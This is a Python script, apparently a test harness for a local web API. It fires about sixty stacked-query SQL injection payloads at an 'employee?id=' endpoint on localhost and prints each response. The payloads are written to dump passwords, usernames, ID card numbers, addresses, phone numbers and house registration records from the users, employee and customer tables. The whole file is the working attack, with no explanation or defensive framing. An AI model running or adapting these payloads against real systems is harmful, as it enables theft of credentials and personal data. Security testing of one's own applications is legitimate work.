import requests

data_set = ['\\"; SELECT customer_id FROM customer#',
            '\\"; SELECT * FROM employee#',
            '\\"; SELECT customer_id, tel, lname FROM customer-- ',
            '\\"; SELECT lname, nickname FROM employee#',
            '\\"; SELECT * FROM users# ',
            '\\"; SELECT employee_id, graduation_certificate, id_card, email, house_registration, tel, lname, nickname, work_background FROM employee# ',
            '\\"; SELECT tel FROM customer# ',
            '\\"; SELECT * FROM customer#',
            '\\"; SELECT * FROM customer# ',
            '\\"; SELECT * FROM service# ',
            '\\"; SELECT fname, house_registration, nickname, lname, id_card, graduation_certificate, employee_id, prefixname, tel FROM employee-- ',
            '\\"; SELECT tel, prefixname, work_background, house_registration, email, id_card, graduation_certificate, employee_id FROM employee#',
            '\\"; SELECT id_card, fname, prefixname FROM employee-- ',
            '\\"; SELECT * FROM service#',
            '\\"; SELECT email, address, id_card, prefixname FROM employee#',
            '\\"; SELECT house_registration, prefixname, address, email, lname, nickname, id_card, graduation_certificate, tel FROM employee# ',
            '\\"; SELECT fname, email, customer_id FROM customer#',
            '\\"; SELECT * FROM service-- ',
            '\\"; SELECT id_card, address, graduation_certificate, lname, nickname, email, employee_id, prefixname FROM employee-- ',
            '\\"; SELECT price FROM service# ',
            '\\"; SELECT customer_id FROM customer-- ',
            '\\"; SELECT * FROM users-- ',
            '\\"; SELECT graduation_certificate, work_background, id_card, address, fname, tel, email, nickname, lname, prefixname, house_registration FROM employee# ',
            '\\"; SELECT * FROM users#',
            '\\"; SELECT nickname, id_card, house_registration, graduation_certificate, prefixname, address, employee_id, lname, tel FROM employee-- ',
            '\\"; SELECT price FROM service-- ',
            '\\"; SELECT username FROM users#',
            '\\"; SELECT tel, fname, customer_id FROM customer# ',
            '\\"; SELECT password FROM users#',
            '\\"; SELECT * FROM employee# ',
            '\\"; SELECT employee_id, lname, prefixname, email, id_card, address, nickname, fname, graduation_certificate, work_background, tel FROM employee# ',
            '\\"; SELECT lname, employee_id, id_card, address, email, fname, nickname FROM employee# ',
            '\\"; SELECT nickname, tel, email, work_background, employee_id, prefixname, id_card FROM employee# ',
            '\\"; SELECT tel, customer_id, lname, fname FROM customer#',
            '\\"; SELECT username FROM users-- ',
            '\\"; SELECT tel, email FROM customer# ',
            '\\"; SELECT graduation_certificate FROM employee# ',
            '\\"; SELECT customer_id, lname FROM customer-- ',
            '\\"; SELECT address, work_background, prefixname, tel, nickname, employee_id, email, lname, graduation_certificate, id_card, fname FROM employee#',
            '\\"; SELECT fname, work_background, employee_id, nickname, graduation_certificate, house_registration, id_card, address, prefixname, tel FROM employee#',
            '\\"; SELECT fname, work_background, graduation_certificate, employee_id, address, house_registration, id_card, tel, nickname FROM employee# ',
            '\\"; SELECT tel, prefixname FROM employee# ',
            '\\"; SELECT tel, fname FROM customer# ',
            '\\"; SELECT fname, lname, tel FROM customer#',
            '\\"; SELECT username FROM users# ',
            '\\"; SELECT customer_id, lname, email FROM customer# ',
            '\\"; SELECT name FROM service#',
            '\\"; SELECT house_registration, prefixname, nickname, tel, fname, employee_id FROM employee# ',
            '\\"; SELECT password FROM users-- ',
            '\\"; SELECT fname, lname FROM customer#',
            '\\"; SELECT price FROM service#',
            '\\"; SELECT * FROM employee-- ',
            '\\"; SELECT id_card, tel, lname, graduation_certificate, work_background FROM employee# ',
            '\\"; SELECT fname, lname, prefixname, email, employee_id, id_card FROM employee# ',
            '\\"; SELECT house_registration, tel, id_card, prefixname, employee_id, work_background, lname, address, email FROM employee# ',
            '\\"; SELECT fname, id_card, tel, address, nickname, employee_id, graduation_certificate FROM employee-- ',
            '\\"; SELECT email, employee_id, tel, address, prefixname, id_card, nickname, house_registration FROM employee# ',
            '\\"; SELECT password FROM users# ',
            '\\"; SELECT id_card, address, email, work_background, tel, graduation_certificate, prefixname, fname FROM employee#',
            '\\"; SELECT email FROM customer# ',
            '\\"; SELECT graduation_certificate, nickname, house_registration, tel, id_card, email, prefixname, work_background, fname, employee_id FROM employee#']


def fetch_data(data):
    try:
        response = requests.get("http://localhost:3000/employee?id=" +
                                data, headers={"Content-Type": "application/json"})
        api_json_data = response.json()
        print(api_json_data)
    except Exception as e:
        print(e)


for data in data_set:
    fetch_data(data)
